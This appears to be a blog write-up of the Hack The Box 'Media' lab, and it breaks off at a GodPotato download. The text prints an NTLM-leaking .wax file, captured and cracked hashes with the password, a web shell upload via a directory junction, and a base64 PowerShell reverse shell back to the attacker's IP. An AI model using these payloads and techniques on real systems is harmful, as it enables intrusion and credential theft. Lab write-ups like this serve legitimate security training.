---
title: Media
date: 2026-04-25
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
lastmod: 2026-04-26T07:12:51.451Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Media" >}}

***

# Recon

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.67 -oN serviceScan.txt

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 00:08 +0800
Nmap scan report for 10.129.234.67
Host is up (0.054s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-25T16:08:27+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2026-04-24T07:19:57
|_Not valid after:  2026-10-24T07:19:57
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-25T16:08:23+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds

```

### Port 80

![Pasted image 20260426001447.png](/ob/Pasted%20image%2020260426001447.png)

seem like that is not the CMS

#### tech stack

{{< code >}}\
Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17 Server at 10.129.234.67 Port 80\
{{< /code >}}

Let try the bruteforce

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ feroxbuster -u http://10.129.234.67   -x php  
                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.234.67/
 🚩  In-Scope Url          │ 10.129.234.67
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      303c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      300c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       30w      336c http://10.129.234.67/js => http://10.129.234.67/js/
301      GET        9l       30w      337c http://10.129.234.67/css => http://10.129.234.67/css/
200      GET       54l      136w     1654c http://10.129.234.67/js/scripts.js
200      GET       34l       81w     3223c http://10.129.234.67/assets/img/logos/facebook.svg
200      GET       42l       91w     4137c http://10.129.234.67/assets/img/logos/microsoft.svg
200      GET       72l      408w    31771c http://10.129.234.67/assets/img/about/3.jpg
200      GET        8l       29w    28898c http://10.129.234.67/assets/favicon.ico
301      GET        9l       30w      340c http://10.129.234.67/assets => http://10.129.234.67/assets/
200      GET       56l      371w    28555c http://10.129.234.67/assets/img/about/4.jpg
200      GET       35l       83w     3282c http://10.129.234.67/assets/img/logos/google.svg
200      GET       24l       91w     2284c http://10.129.234.67/assets/img/logos/ibm.svg
200      GET       41l      211w    17529c http://10.129.234.67/assets/img/about/2.jpg
200      GET      226l     1276w   102947c http://10.129.234.67/assets/img/team/3.jpg
200      GET        1l       19w      333c http://10.129.234.67/assets/img/close-icon.svg
200      GET      229l     1232w   110331c http://10.129.234.67/assets/img/team/2.jpg
200      GET       59l      368w    34985c http://10.129.234.67/assets/img/about/1.jpg
200      GET    11316l    23841w   250501c http://10.129.234.67/css/styles.css
200      GET      280l      961w    71959c http://10.129.234.67/assets/img/team/1.jpg
403      GET       11l       47w      422c http://10.129.234.67/webalizer
200      GET      165l      543w    47433c http://10.129.234.67/assets/img/portfolio/4.jpg
200      GET      335l     1183w    18617c http://10.129.234.67/
200      GET      113l      706w    57871c http://10.129.234.67/assets/img/portfolio/6.jpg
200      GET      103l      336w    29948c http://10.129.234.67/assets/img/portfolio/3.jpg
200      GET       92l      350w    29256c http://10.129.234.67/assets/img/portfolio/5.jpg
200      GET       70l      590w    56758c http://10.129.234.67/assets/img/portfolio/2.jpg
200      GET       72l      435w    30913c http://10.129.234.67/assets/img/portfolio/1.jpg
403      GET       11l       47w      422c http://10.129.234.67/phpmyadmin
200      GET      335l     1183w    18617c http://10.129.234.67/index.php
301      GET        9l       30w      337c http://10.129.234.67/CSS => http://10.129.234.67/CSS/
200      GET        1l       62w    14220c http://10.129.234.67/assets/img/navbar-logo.svg
200      GET    11316l    23841w   250501c http://10.129.234.67/CSS/styles.css
301      GET        9l       30w      336c http://10.129.234.67/JS => http://10.129.234.67/JS/
200      GET       54l      136w     1654c http://10.129.234.67/JS/scripts.js
301      GET        9l       30w      340c http://10.129.234.67/Assets => http://10.129.234.67/Assets/
503      GET       11l       44w      403c http://10.129.234.67/examples
200      GET        8l       29w    28898c http://10.129.234.67/Assets/favicon.ico
200      GET        1l       19w      333c http://10.129.234.67/Assets/img/close-icon.svg
200      GET        1l       62w    14220c http://10.129.234.67/Assets/img/navbar-logo.svg
200      GET       34l       81w     3223c http://10.129.234.67/Assets/img/logos/facebook.svg
200      GET       41l      211w    17529c http://10.129.234.67/Assets/img/about/2.jpg
200      GET       56l      371w    28555c http://10.129.234.67/Assets/img/about/4.jpg
200      GET       59l      368w    34985c http://10.129.234.67/Assets/img/about/1.jpg
200      GET      229l     1232w   110331c http://10.129.234.67/Assets/img/team/2.jpg
200      GET       92l      350w    29256c http://10.129.234.67/Assets/img/portfolio/5.jpg
200      GET      280l      961w    71959c http://10.129.234.67/Assets/img/team/1.jpg
200      GET      226l     1276w   102947c http://10.129.234.67/Assets/img/team/3.jpg
200      GET      165l      543w    47433c http://10.129.234.67/Assets/img/portfolio/4.jpg
200      GET      113l      706w    57871c http://10.129.234.67/Assets/img/portfolio/6.jpg
301      GET        9l       30w      336c http://10.129.234.67/Js => http://10.129.234.67/Js/
301      GET        9l       30w      337c http://10.129.234.67/Css => http://10.129.234.67/Css/
200      GET       54l      136w     1654c http://10.129.234.67/Js/scripts.js
200      GET      793l     5777w   547359c http://10.129.234.67/assets/img/map-image.png
200      GET       70l      590w    56758c http://10.129.234.67/Assets/img/portfolio/2.jpg
200      GET       72l      435w    30913c http://10.129.234.67/Assets/img/portfolio/1.jpg
200      GET      103l      336w    29948c http://10.129.234.67/Assets/img/portfolio/3.jpg
200      GET      943l     7123w   673180c http://10.129.234.67/Assets/img/map-image.png
200      GET    11316l    23841w   250501c http://10.129.234.67/Css/styles.css
403      GET       11l       47w      422c http://10.129.234.67/licenses
403      GET       11l       47w      422c http://10.129.234.67/server-status
200      GET      335l     1183w    18617c http://10.129.234.67/Index.php
403      GET       11l       47w      422c http://10.129.234.67/server-info
[####################] - 2m     60222/60222   0s      found:61      errors:5      
[####################] - 2m     60000/60000   531/s   http://10.129.234.67/ 
[####################] - 1s     60000/60000   50420/s http://10.129.234.67/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     60000/60000   29836/s http://10.129.234.67/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     60000/60000   37500/s http://10.129.234.67/assets/img/team/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     60000/60000   56338/s http://10.129.234.67/assets/img/about/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     60000/60000   205479/s http://10.129.234.67/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     60000/60000   54995/s http://10.129.234.67/assets/img/logos/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     60000/60000   8061/s  http://10.129.234.67/assets/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     60000/60000   133038/s http://10.129.234.67/assets/img/portfolio/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     60000/60000   62630/s http://10.129.234.67/CSS/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     60000/60000   298507/s http://10.129.234.67/JS/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     60000/60000   175439/s http://10.129.234.67/Assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 4s     60000/60000   14706/s http://10.129.234.67/Assets/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     60000/60000   37975/s http://10.129.234.67/Assets/img/team/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     60000/60000   21030/s http://10.129.234.67/Assets/img/portfolio/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     60000/60000   54201/s http://10.129.234.67/Assets/img/about/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     60000/60000   75472/s http://10.129.234.67/Assets/img/logos/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     60000/60000   405405/s http://10.129.234.67/Js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     60000/60000   31546/s http://10.129.234.67/Css/ => Directory listing (add --scan-dir-listings to scan)     
```

Nothing interesting here.

The file upload seems like the most likely point of attack. In searching for ways to attack Windows Media Player, I’ll find an article from Morphisec, “[NTLM Privilege Escalation: The Unpatched Microsoft Vulnerabilities No One is Talking About](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)”. It has five examples, and the forth is about `.wax` files, which are audio shortcuts for Windows Media Player. When opened with Windows Media Player, these will try to fetch a media stream from a server defined in the file, authenticating with their NTLM hash if necessary.

The article above has an example file which I’ll copy. It’s simple XML:\
`voicemail.wax`\
{{< code >}}\ <asx version="3.0">\ <title>Leak</title>\ <entry>\ <title></title>\ <ref href="file://10.10.16.39\test\0xdf.mp3"/>\ </entry>\ </asx>\
{{< /code >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.39]
    Responder IPv6             [fe80::9266:af56:e1ec:f941
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-3GPJAROFH01]
    Responder Domain Name      [FP4T.LOCAL]
    Responder DCE-RPC Port     [45733]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                              

[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox                   
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:2977eab4158321b0:0F8884744A95D534B0D76BF68B3234D2:0101000000000000003F04A013D5DC01837F4EDC16173D460000000002000800460050003400540001001E00570049004E002D003300470050004A00410052004F00460048003000310004003400570049004E002D003300470050004A00410052004F0046004800300031002E0046005000340054002E004C004F00430041004C000300140046005000340054002E004C004F00430041004C000500140046005000340054002E004C004F00430041004C0007000800003F04A013D5DC0106000400020000000800300030000000000000000000000000300000CB70BEA18E1381324B563BC70F1C40076DB77D792911D5339747C276D778700A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330039000000000000000000                       
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox


```

I’ll save the hash to a file, and pass it to `hashcat`, which detects the mode and cracks it with `rockyou.txt` in a few seconds:

```
$ hashcat enox.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
ENOX::MEDIA:76cfab6bd4aa1cd5:0e8659aefe42ddb294d71d24cf73b132:01010000000000000033a321b21ddc014cc49b403556b6bc00000000020008004800510042004f0001001e00570049004e002d00410039004800560044004a005a0048004c004300370004003400570049004e002d00410039004800560044004a005a0048004c00430037002e004800510042004f002e004c004f00430041004c00030014004800510042004f002e004c004f00430041004c00050014004800510042004f002e004c004f00430041004c00070008000033a321b21ddc0106000400020000000800300030000000000000000000000000300000bbfd9c8c6065836836ac9a1dc036176844e63060b66234c63d37026259d006220a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340038000000000000000000:1234virus@
...[snip]...
```

This works over SSH to get a shell:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ssh ENOX@10.129.234.67

```

```
enox@MEDIA C:\Users\enox\Desktop>type user.txt
102685346be266944e64b696cd705023
```

No other user. , so the taget is Administrator

```
PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/1/2023  11:48 PM                Administrator
d-----         10/2/2023  10:26 AM                enox
d-r---         10/1/2023  11:48 PM                Public


PS C:\Users>

```

xampp is the web hosting server

```
PS C:\xampp> dir


    Directory: C:\xampp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:57 AM                apache
d-----         10/2/2023  10:57 AM                cgi-bin
d-----         10/2/2023  10:57 AM                contrib
d-----         10/2/2023  10:57 AM                FileZillaFTP
d-----         10/2/2023  10:27 AM                htdocs                                                                                                                             
d-----         10/2/2023  10:57 AM                install
d-----         10/2/2023  10:57 AM                licenses
d-----         10/2/2023  10:57 AM                locale
d-----         10/2/2023  10:57 AM                MercuryMail
d-----         10/2/2023  10:57 AM                mysql
d-----         10/2/2023  10:58 AM                perl
d-----         10/2/2023  11:01 AM                php
d-----         10/2/2023  11:03 AM                phpMyAdmin
d-----         10/2/2023  11:03 AM                sendmail
d-----         4/25/2026   9:38 AM                tmp                                                                                                                                
d-----         10/2/2023  11:03 AM                tomcat
d-----         10/2/2023  11:03 AM                webalizer
d-----         10/2/2023  11:03 AM                webdav
-a----          6/7/2013  11:15 AM            436 apache_start.bat                                                                                                                   
-a----         10/1/2019   7:13 AM            190 apache_stop.bat                                                                                                                    
-a----          4/5/2021   4:16 PM          10324 catalina_service.bat
-a----          4/5/2021   4:17 PM           3766 catalina_start.bat
-a----          4/5/2021   4:17 PM           3529 catalina_stop.bat
-a----          6/3/2019  11:39 AM            471 mysql_start.bat                                                                                                                    
-a----         10/1/2019   7:13 AM            270 mysql_stop.bat
-a----         3/13/2017  11:04 AM            824 passwords.txt
-a----          4/6/2023   9:04 AM           7653 readme_de.txt
-a----          4/6/2023   9:04 AM           7515 readme_en.txt
-a----        11/12/2015   4:13 PM            370 setup_xampp.bat
-a----        11/29/2020   1:38 PM           1671 test_php.bat                                                                                                                       
-a----          4/6/2021  11:38 AM        3368448 xampp-control.exe
-a----          4/5/2021   4:08 PM            978 xampp-control.ini
-a----         3/30/2013  12:29 PM         118784 xampp_start.exe                                                                                                                    
-a----         3/30/2013  12:29 PM         118784 xampp_stop.exe

```

`index.php` is large, but most of it is static HTML. The PHP that handles the uploads is at the top:

When there’s an upload, it creates the MD5 folder name I previous observed using a combination of the first name, last name, and email:

{{< code >}}\
$folderName = md5($firstname . $lastname . $email);\
{{< /code >}}

```
PS C:\windows\tasks\Uploads> cmd /c mklink /J C:\Windows\Tasks\Uploads\4e422e23b6f3750cea2a3f773517e883 C:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\4e422e23b6f3750cea2a3f773517e883 <<===>> C:\xampp\htdocs
PS C:\windows\tasks\Uploads> ls 4e422e23b6f3750cea2a3f773517e883


    Directory: C:\windows\tasks\Uploads\4e422e23b6f3750cea2a3f773517e883


Mode                 LastWriteTime         Length Name                                                                                                                               
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css                                                                                                                                
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php


PS C:\windows\tasks\Uploads>
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

--2026-04-26 01:05:22--  https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20321 (20K) [text/plain]
Saving to: ‘shell.php’

shell.php                    100%[=============================================>]  19.84K  --.-KB/s    in 0.006s  

2026-04-26 01:05:23 (3.21 MB/s) - ‘shell.php’ saved [20321/20321]

```

![Pasted image 20260426005917.png](/ob/Pasted%20image%2020260426005917.png)

```
PS C:\windows\tasks\Uploads\4e422e23b6f3750cea2a3f773517e883> ls


    Directory: C:\windows\tasks\Uploads\4e422e23b6f3750cea2a3f773517e883


Mode                 LastWriteTime         Length Name                                                              
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets                                                            
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php                                                         
-a----         4/25/2026   9:58 AM             33 revshell.php                                                      

```

```
PS C:\windows\tasks\Uploads\4e422e23b6f3750cea2a3f773517e883> ls C:\xampp\htdocs\


    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php                                                         
-a----         4/25/2026   9:58 AM             33 shell.php


```

![Pasted image 20260426010800.png](/ob/Pasted%20image%2020260426010800.png)

```
LOCAL SERVICE@MEDIA:C:\Users\Administrator# whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

There’s a nice tool, [FullPowers](https://github.com/itm4n/FullPowers), designed to restore the default privilege set for the account by creating a scheduled task and running it. I’ll download a copy from the [release page](https://github.com/itm4n/FullPowers/releases/) and upload it to Media using `scp`:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe 
--2026-04-26 01:11:15--  https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/244003346/cb3f5900-5b27-11ea-8b6f-a457ff66521a?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-25T17%3A53%3A29Z&rscd=attachment%3B+filename%3DFullPowers.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-25T16%3A52%3A43Z&ske=2026-04-25T17%3A53%3A29Z&sks=b&skv=2018-11-09&sig=QCMWnVTagUKu%2BS2hcMDimoAiFLoh98JsSLOjwcgCOlA%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NzEzNzM3NSwibmJmIjoxNzc3MTM3MDc1LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.zcYcrKtUnXNLJSMysqv3Eq8ThQ6GjA2fxRsBG5PSN08&response-content-disposition=attachment%3B%20filename%3DFullPowers.exe&response-content-type=application%2Foctet-stream [following]
--2026-04-26 01:11:16--  https://release-assets.githubusercontent.com/github-production-release-asset/244003346/cb3f5900-5b27-11ea-8b6f-a457ff66521a?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-25T17%3A53%3A29Z&rscd=attachment%3B+filename%3DFullPowers.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-25T16%3A52%3A43Z&ske=2026-04-25T17%3A53%3A29Z&sks=b&skv=2018-11-09&sig=QCMWnVTagUKu%2BS2hcMDimoAiFLoh98JsSLOjwcgCOlA%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NzEzNzM3NSwibmJmIjoxNzc3MTM3MDc1LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.zcYcrKtUnXNLJSMysqv3Eq8ThQ6GjA2fxRsBG5PSN08&response-content-disposition=attachment%3B%20filename%3DFullPowers.exe&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36864 (36K) [application/octet-stream]
Saving to: ‘FullPowers.exe’

FullPowers.exe               100%[=============================================>]  36.00K  --.-KB/s    in 0.01s   

2026-04-26 01:11:16 (2.80 MB/s) - ‘FullPowers.exe’ saved [36864/36864]


```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sshpass -p '1234virus@' scp FullPowers.exe enox@10.129.234.67:/programdata/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
                                                                            
```

Now I just run it with the `-c` option and a reverse shell, and the `-z` option for non-interactive:

```
LOCAL SERVICE@MEDIA:C:\ProgramData# .\FullPowers.exe -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -z
```

get the shell

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ rlwrap -cAr nc -lnvp 444
listening on [any] 444 ...
connect to [10.10.16.39] from (UNKNOWN) [10.129.234.67] 62808
dir


    Directory: C:\Windows\system32

```

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

```

To exploit `SeImpersonatePrivilege`, I’ll use [GodPotato](https://github.com/BeichenDream/GodPotato). I’ll download the latest release and upload it to Media:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe    
--2026-04-26 01:17:06--  https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
